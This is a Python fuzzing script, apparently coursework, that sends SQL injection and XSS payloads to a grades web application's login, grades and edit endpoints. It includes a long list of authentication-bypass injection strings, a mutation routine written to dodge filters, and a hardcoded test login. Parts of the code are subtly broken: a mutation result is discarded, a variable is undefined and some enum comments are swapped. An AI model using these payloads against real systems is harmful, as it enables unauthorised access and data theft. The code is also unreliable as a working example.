#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, sys, inspect
import requests        # for sending/receiving web requests
import random
from enum import Enum  # for defining enumerations

class CommandLine:
    
## MARK - Initialisation method, get the file path of the XSS payloads,
# determine whether to show payloads in results and set the root_url. 
    def __init__(self):
        self.appRootURL = sys.argv[1]
        showPayloads = sys.argv[2]
        xssPayloadFileName = sys.argv[3]
        currentDirectory = os.path.dirname(os.path.abspath(inspect.stack()[0][1]))
        payloadFile = open(currentDirectory + '/' + xssPayloadFileName, 'r')
        self.xssPayloads = payloadFile.readlines()
        
        if showPayloads == "-s":
            self.showPayloads = True
        elif showPayloads == "-n":
            self.showPayloads = False
        

class PayloadType(Enum):
    SQL_STATIC = 1 # fuzz with a pre-configured list of SQL payloads
    XSS_STATIC = 2 # fuzz with a pre-configured list of XSS payloads
    XSS        = 3 # fuzz with dynamically generated SQL payloads (mutations) 
    SQL        = 4 # fuzz with dynamically generated XSS payloads (mutations) 

## MARK - Configurations for the endpoints found in the app

class SQLFuzzConfig:
    def __init__(self):
        self.app_root_url = CommandLine().appRootURL
        self.login_endpoint = {
            "url": "/sign_in",
            "param_data": {
                "login": "peter",
                "password": "football"
            }
        }
        self.endpoints = [
            {
                "url": "/grades",
                "method": "GET",
                "require_login": False,
                "param_data": {},
                "cookie_data": {
                    "session": PayloadType.SQL,
                },
            },
            {
                "url": "/grades",
                "method": "GET",
                "require_login": True,
                "param_data": {
                    "lecturer": PayloadType.SQL
                },
                "cookie_data": {},
            },
            {
                "url": "/sign_in",
                "method": "POST",
                "require_login": False,
                "param_data": {
                    "login": PayloadType.SQL,
                    "password": PayloadType.SQL_STATIC
                },
                "cookie_data": {},
            },    
            {
                "url": "/grades/1/edit",
                "method": "POST",
                "require_login": True,
                "param_data": {
                    "_method": "patch",
                    "grade[comment]" : PayloadType.XSS,
                },
                "cookie_data": {},
            }
        ]
            
class Attacks:
    internalServerErrorCount = 0
    internalServerErrorPayloads = []
    successfulLoginCount = 0
    successfulLoginPayload = []
    xssCount = 0
    xssPayloads = []
    mutationCount = 0
    
## MARK - Method to start mutated sql injection attack on an endpoint
    
    def sqlAttack(session, key, endpoint, payloads):        
        config = SQLFuzzConfig()
        for payload in payloads:
            Attacks.sendAttack(session, config, key, endpoint, payload, False, "SQL")
            
## MARK - Method to start static sql injection attack on an endpoint
        
    def staticSQLAttack(session, key, endpoint, payloads):
        config = SQLFuzzConfig()
        for payload in payloads:
            Attacks.sendAttack(session, config, key, endpoint, payload, True, "SQL")
    
## MARK - Method to start mutated  XSS attack on an endpoint
    
    def xssAttack(session, key, endpoint, payloads):
        config = SQLFuzzConfig()
        for payload in payloads:
            Attacks.sendAttack(session, config, key, endpoint, payload, False, "XSS")
    
## MARK - Method to start static XSS attack on an endpoint
    
    def staticXSSAttack(session, key, endpoint, payloads):
        config = SQLFuzzConfig()
        for payload in payloads:
            Attacks.sendAttack(session, config, key, endpoint, payload, True, "XSS")
        
## MARK - Method to send the request to the app with the desired payload
        
    def sendAttack(session, config, key, endpoint, payload, isStatic, payloadType):
        if endpoint["param_data"]:
            schema = endpoint["param_data"]
            for key in schema:
                schema[key] = payload
            req = session.request(endpoint["method"], config.app_root_url + endpoint["url"], data = schema)
        if endpoint["cookie_data"]:
            schema = endpoint["cookie_data"]
            for key in schema:
                schema[key] = payload
            req = session.request(endpoint["method"], config.app_root_url + endpoint["url"], cookies = schema)
        
        Attacks.checkPayload(req, isStatic, payloadType, payload, session, key, endpoint)
            
## MARK - Method to check the response from the request and determine whether payload was successful

    def checkPayload(req, isStatic, payloadType, payload, session, key, endpoint):
        if payloadType == "XSS":
            if payload in req.text and req.status_code != 404:                
                Attacks.xssCount += 1
                Attacks.xssPayloads.append(payload)
                
        elif payloadType == "SQL":
            if req.status_code == 500: 
                Attacks.internalServerErrorCount += 1
                Attacks.internalServerErrorPayloads.append(payload)
            elif req.status_code == 200:
                if 'Login successful!' in req.text:
                    Attacks.successfulLoginCount += 1
                    Attacks.successfulLoginPayload.append(payload)
                else:                
                    if not isStatic and Attacks.mutationCount < 5:
                        Attacks.sendAttack(session, config, key, endpoint, Attacks.mutatePayload(payloadType, payload), isStatic, payloadType)
                    else:
                        Attacks.mutationCount = 0
            else:
                if not isStatic and Attacks.mutationCount < 5:
                    Attacks.mutationCount += 1
                    Attacks.sendAttack(session, config, key, endpoint, Attacks.mutatePayload(payloadType, payload), isStatic, payloadType)
                else:
                    Attacks.mutationCount = 0
        
## MARK - Method to randomly mutate the payloads depending on payload type
    
    def mutatePayload(payloadType, payload):
        if payloadType == "SQL":
            mutationSelector = random.randint(1, 4)
        elif payloadType == "XSS":
            mutationSelector = random.randint(1, 2)
        
        if mutationSelector == 1:
            # Add extra term to end of payload
            if payloadType == "XSS":
                payload += " <script>alert('THIS IS AN XSS ATTACK')</script>"
            elif payloadType == "SQL":
                payload += "'"
            
            return payload
        
        if mutationSelector == 2:
            # Replace potentially flagged payload terms with equivalents
            if "&&" in payload:
                payload = payload.replace("&&", " and ")
            if "||" in payload:
                payload = payload.replace("||", " or ")
            if "=" in payload:
                payload = payload.replace("=", " like ")
            if "!=" in payload:
                payload = payload.replace("!=", " not like ")
            
            return payload
        
        if mutationSelector == 3:
            # Swap terms around
            repeats = random.randint(1, 2)
            payloadList = list(payload) 
            
            for i in range(repeats):
                index1 = random.randint(0, len(payload) - 1)
                index2 = random.randint(0, len(payload) - 1)
                payloadList[index1], payloadList[index2] = payloadList[index2], payloadList[index1]
            
            payload = "".join(payloadList)
            return payload
            
        if mutationSelector == 4:
            # Repeat term multiple times
            index = random.randint(0, len(payload) - 1)
            repeatSection = payload[index:]
            repeats = random.randint(1, 3)
            
            for i in range(repeats):
                payload[:index] + repeatSection + payload[index:]
            
            return payload
       
## MARK - Method to send the request to the app with the desired payload
        
    def resetAndPrintStats(endpoint, commandlineArgs):
        print("For endpoint, " + endpoint["url"] + ", with required login " + str(endpoint["require_login"]))
        if commandlineArgs.showPayloads:
            if Attacks.internalServerErrorCount != 0:
                print(str(Attacks.internalServerErrorCount) + " Internal Server Errors were triggered using payloads: " + ', '.join(Attacks.internalServerErrorPayloads))
            if Attacks.successfulLoginCount != 0:
                print("Successful un-authorised access was achieved " + str(Attacks.successfulLoginCount) + " times, using payloads: " + ', '.join(Attacks.successfulLoginPayload))
            if Attacks.xssCount != 0:
                print(str(Attacks.xssCount) + " successful XSS payloads were found: " + ', '.join(Attacks.xssPayloads))   
        else:
            if Attacks.internalServerErrorCount != 0:
                print(str(Attacks.internalServerErrorCount) + " Internal Server Errors were triggered.")
            if Attacks.successfulLoginCount != 0:
                print("Successful un-authorised access was achieved " + str(Attacks.successfulLoginCount) + " times.")
            if Attacks.xssCount != 0:
                print(str(Attacks.xssCount) + " successful XSS were found.") 
                                
    
if __name__ == '__main__':
    payloads = ["root' --","root' #","root'/*","root' or '1'='1","root' or '1'='1'--","root' or '1'='1'#","root' or '1'='1'/*","root'or 1=1 or ''='","root' or 1=1","root' or 1=1--","root' or 1=1#","root' or 1=1/*","root') or ('1'='1","root') or ('1'='1'--","root') or ('1'='1'#","root') or ('1'='1'/*","root') or '1'='1","root') or '1'='1'--","root') or '1'='1'#","root') or '1'='1'/*","or 1=1","or 1=1--","or 1=1#","or 1=1/*","' or 1=1","' or 1=1--","' or 1=1#","' or 1=1/*","\" or 1=1","\" or 1=1--","\" or 1=1#","\" or 1=1/*","1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055","root\" --","root\" #","root\"/*","root\" or \"1\"=\"1","root\" or \"1\"=\"1\"--","root\" or \"1\"=\"1\"#","root\" or \"1\"=\"1\"/*","root\" or 1=1 or \"\"=\"","root\" or 1=1","root\" or 1=1--","root\" or 1=1#","root\" or 1=1/*","root\") or (\"1\"=\"1","root\") or (\"1\"=\"1\"--","root\") or (\"1\"=\"1\"#","root\") or (\"1\"=\"1\"/*","root\") or \"1\"=\"1","root\") or \"1\"=\"1\"--","root\") or \"1\"=\"1\"#","root\") or \"1\"=\"1\"/*","1234 \" AND 1=0 UNION ALL SELECT \"root\", \"81dc9bdb52d04dc20036dbd8313ed055","admin' --","admin' #","admin'/*","admin' or '1'='1","admin' or '1'='1'--","admin' or '1'='1'#","admin' or '1'='1'/*","admin'or 1=1 or ''='","admin' or 1=1","admin' or 1=1--","admin' or 1=1#","admin' or 1=1/*","admin') or ('1'='1","admin') or ('1'='1'--","admin') or ('1'='1'#","admin') or ('1'='1'/*","admin') or '1'='1","admin') or '1'='1'--","admin') or '1'='1'#","admin') or '1'='1'/*","1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055","admin\" --","admin\" #","admin\"/*","admin\" or \"1\"=\"1","admin\" or \"1\"=\"1\"--","admin\" or \"1\"=\"1\"#","admin\" or \"1\"=\"1\"/*","admin\"or 1=1 or \"\"=\"","admin\" or 1=1","admin\" or 1=1--","admin\" or 1=1#","admin\" or 1=1/*","admin\") or (\"1\"=\"1","admin\") or (\"1\"=\"1\"--","admin\") or (\"1\"=\"1\"#","admin\") or (\"1\"=\"1\"/*","admin\") or \"1\"=\"1","admin\") or \"1\"=\"1\"--","admin\") or \"1\"=\"1\"#","admin\") or \"1\"=\"1\"/*","1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055"]
    commandlineArgs = CommandLine()
    config = SQLFuzzConfig()
    print("\n")
           
    
    for endpoint in config.endpoints:
        session = requests.session()
        print("~~~~~ Fuzzing Endpoint " + str(endpoint["url"]) + " ~~~~~" )
        if endpoint["require_login"]:    
            req = session.post(config.app_root_url + config.login_endpoint["url"], data = config.login_endpoint["param_data"])
        for key, value in endpoint["param_data"].items():
            if type(value) is dict:
                for subKey, subVal in value.items():
                    if subVal == PayloadType.SQL_STATIC:
                        Attacks.staticSQLAttack(session, key, endpoint, payloads)
                    elif subVal == PayloadType.XSS_STATIC:
                        Attacks.staticXSSAttack(session, key, endpoint, commandlineArgs.xssPayloads)
                    elif subVal == PayloadType.XSS:
                        Attacks.xssAttack(session, key, endpoint, commandlineArgs.xssPayloads)
                    elif subVal == PayloadType.SQL:
                        Attacks.sqlAttack(session, key, endpoint, payloads)
                
            else:
                if value == PayloadType.SQL_STATIC:
                    Attacks.staticSQLAttack(session, key, endpoint, payloads)
                elif value == PayloadType.XSS_STATIC:
                    Attacks.staticXSSAttack(session, key, endpoint, commandlineArgs.xssPayloads)
                elif value == PayloadType.XSS:
                    Attacks.xssAttack(session, key, endpoint, commandlineArgs.xssPayloads)
                elif value == PayloadType.SQL:
                    Attacks.sqlAttack(session, key, endpoint, payloads)
                    
        for key, value in endpoint["cookie_data"].items():
            if value == PayloadType.SQL_STATIC:
                Attacks.staticSQLAttack(session, key, endpoint, payloads)
            elif value == PayloadType.XSS_STATIC:
                Attacks.staticXSSAttack(session, key, endpoint, commandlineArgs.xssPayloads)
            elif value == PayloadType.XSS:
                Attacks.xssAttack(session, key, endpoint, commandlineArgs.xssPayloads)
            elif value == PayloadType.SQL:
                Attacks.sqlAttack(session, key, endpoint, payloads)
            
        Attacks.resetAndPrintStats(endpoint, commandlineArgs)
        print("\n")
        
        Attacks.internalServerErrorCount = 0
        Attacks.internalServerErrorPayloads = []
        Attacks.successfulLoginCount = 0
        Attacks.successfulLoginPayload = []
        Attacks.xssCount = 0
        Attacks.xssPayloads = []
